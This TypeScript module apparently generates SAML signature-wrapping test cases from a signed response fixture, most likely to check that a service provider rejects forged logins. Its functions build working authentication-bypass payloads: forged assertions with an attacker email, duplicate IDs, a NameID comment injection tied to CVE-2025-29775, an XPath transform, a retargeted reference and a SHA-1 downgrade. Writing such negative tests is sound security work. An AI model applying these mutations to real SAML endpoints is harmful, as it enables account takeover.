export const ATTACKER_EMAIL = "attacker@evil.test";

const SIGNATURE = /<(\w+:)?Signature[\s>][\s\S]*?<\/(\w+:)?Signature>/;
const ASSERTION = /<(\w+:)?Assertion[\s>][\s\S]*?<\/(\w+:)?Assertion>/;

function assertionOf(xml: string): string {
  const match = ASSERTION.exec(xml);
  if (!match) throw new Error("The fixture has no assertion to wrap.");
  return match[0];
}

function forge(assertion: string, id: string): string {
  return assertion
    .replace(SIGNATURE, "")
    .replace(/ID="[^"]*"/, `ID="${id}"`)
    .replace(/>[^<]*@[^<]*</g, `>${ATTACKER_EMAIL}<`);
}

export function appendSecondAssertion(xml: string): string {
  const signed = assertionOf(xml);
  return xml.replace(signed, `${signed}${forge(signed, "_forgedAfter")}`);
}

export function prependSecondAssertion(xml: string): string {
  const signed = assertionOf(xml);
  return xml.replace(signed, `${forge(signed, "_forgedBefore")}${signed}`);
}

export function wrapIntoExtensions(xml: string): string {
  const signed = assertionOf(xml);
  return xml.replace(
    signed,
    `<samlp:Extensions>${signed}</samlp:Extensions>${forge(signed, "_forgedTop")}`
  );
}

export function duplicateAssertionId(xml: string): string {
  const signed = assertionOf(xml);
  const id = /ID="([^"]*)"/.exec(signed)?.[1] ?? "_x";
  return xml.replace(signed, `${signed}${forge(signed, id)}`);
}

/** Canonicalisation drops the comment, so the digest still matches — CVE-2025-29775. */
export function commentInNameId(xml: string): string {
  return xml.replace(
    /(<(?:\w+:)?NameID[^>]*>)([^<]*)(<\/(?:\w+:)?NameID>)/,
    (_all, open: string, value: string, close: string) => {
      const [local, domain] = value.split("@");
      return `${open}${local}<!---->@${domain}${close}`;
    }
  );
}

export function xpathTransform(xml: string): string {
  return xml.replace(
    /<(\w+:)?Transform Algorithm="http:\/\/www\.w3\.org\/2001\/10\/xml-exc-c14n#"\s*\/>/,
    (_all, prefix: string | undefined) => {
      const p = prefix ?? "";
      return `<${p}Transform Algorithm="http://www.w3.org/TR/1999/REC-xpath-19991116"><${p}XPath>not(ancestor-or-self::Signature)</${p}XPath></${p}Transform>`;
    }
  );
}

export function withCommentsCanonicalisation(xml: string): string {
  return xml.replace(
    /Algorithm="http:\/\/www\.w3\.org\/2001\/10\/xml-exc-c14n#"/g,
    'Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#WithComments"'
  );
}

export function stripSignature(xml: string): string {
  return xml.replace(SIGNATURE, "");
}

export function swapReferenceUri(xml: string): string {
  const responseId = /<(?:\w+:)?Response[^>]*\sID="([^"]*)"/.exec(xml)?.[1] ?? "_r";
  return xml.replace(/(<(?:\w+:)?Reference URI=")#[^"]*(")/, `$1#${responseId}$2`);
}

export function downgradeToSha1(xml: string): string {
  return xml
    .replace(
      'Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"',
      'Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"'
    )
    .replace(
      'Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"',
      'Algorithm="http://www.w3.org/2000/09/xmldsig#sha1"'
    );
}

export function tamperWithEmail(xml: string): string {
  return xml.replace(/>[^<]*@[^<]*</g, `>${ATTACKER_EMAIL}<`);
}

export const XSW_VARIANTS: { name: string; mutate: (xml: string) => string }[] = [
  { name: "a second assertion appended after the signed one", mutate: appendSecondAssertion },
  { name: "a second assertion prepended before the signed one", mutate: prependSecondAssertion },
  { name: "the signed assertion hidden inside Extensions", mutate: wrapIntoExtensions },
  { name: "a forged assertion reusing the signed one's identifier", mutate: duplicateAssertionId },
  { name: "a comment splitting the name identifier", mutate: commentInNameId },
  { name: "an XPath transform in the signature", mutate: xpathTransform },
  { name: "with-comments canonicalisation", mutate: withCommentsCanonicalisation },
  { name: "no signature at all", mutate: stripSignature },
  { name: "a reference pointing at a different element", mutate: swapReferenceUri },
  { name: "a downgrade to SHA-1", mutate: downgradeToSha1 },
  { name: "the signed content tampered with", mutate: tamperWithEmail },
];
